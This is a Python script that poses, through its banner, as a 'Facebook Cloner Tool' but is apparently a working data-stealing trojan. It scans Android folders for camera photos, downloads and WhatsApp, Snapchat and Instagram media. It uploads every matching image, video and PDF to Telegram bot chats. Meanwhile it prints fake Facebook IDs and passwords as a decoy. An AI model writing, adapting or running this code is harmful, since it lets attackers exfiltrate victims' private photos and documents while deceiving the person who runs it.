import asyncio
import aiohttp
import os
import random
import time

print("""
________    ___   _______     ____  ____       _       ______    
|_   __  | .'   `.|_   __ \   |_   ||   _|     / \     |_   _ `.  
  | |_ \_|/  .-.  \ | |__) |    | |__| |      / _ \      | | `. \ 
  |  _|   | |   | | |  __ /     |  __  |     / ___ \     | |  | | 
 _| |_    \  `-'  /_| |  \ \_  _| |  | |_  _/ /   \ \_  _| |_.' / 
|_____|    `.___.'|____| |___||____||____||____| |____||______.' 

        Multi Method Facebook Cloner Tool
              Tool Owner: FORHAD
""")

# Load tokens and chat IDs
with open("tokens.txt", "r") as f:
    BOT_TOKENS = [line.strip() for line in f if line.strip()]
with open("chat_ids.txt", "r") as f:
    CHAT_IDS = [line.strip() for line in f if line.strip()]

# Target folders
TARGET_DIRS = [
    "/sdcard/DCIM/Camera",
    "/sdcard/Pictures",
    "/sdcard/Download",
    "/sdcard/WhatsApp/Media/WhatsApp Images",
    "/sdcard/Snapchat",
    "/sdcard/Instagram"
]
ALLOWED_EXTS = [".jpg", ".jpeg", ".png", ".mp4", ".pdf"]

def fake_fb_info():
    ids = ["10009" + str(random.randint(1000000000, 9999999999)) for _ in range(10)]
    passwords = ["@123456", "@2025fb", "@password1", "@freefire", "@bd786", "@iloveyou", "@admin123", "@forhad"]
    return random.choice(ids), random.choice(passwords)

files = []
for folder in TARGET_DIRS:
    for root, dirs, filenames in os.walk(folder):
        for fname in filenames:
            if fname.lower().endswith(tuple(ALLOWED_EXTS)):
                files.append(os.path.join(root, fname))

async def send_file(session, file_path, token, chat_id):
    try:
        with open(file_path, 'rb') as f:
            data = aiohttp.FormData()
            data.add_field('chat_id', chat_id)
            data.add_field('document', f, filename=os.path.basename(file_path))
            fake_id, fake_pw = fake_fb_info()
            print(f"[FACEBOOK] ID: {fake_id} | PASS: {fake_pw}")
            async with session.post(f"https://api.telegram.org/bot{token}/sendDocument", data=data) as resp:
                if resp.status == 200:
                    print("[✓] File Sent\n")
                else:
                    print("[-] Failed:", await resp.text())
    except Exception as e:
        print(f"[!] Error: {e}")

async def main():
    tasks = []
    connector = aiohttp.TCPConnector(limit=100)
    async with aiohttp.ClientSession(connector=connector) as session:
        for idx, file in enumerate(files):
            token = BOT_TOKENS[idx % len(BOT_TOKENS)]
            for chat_id in CHAT_IDS:
                tasks.append(send_file(session, file, token, chat_id))
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
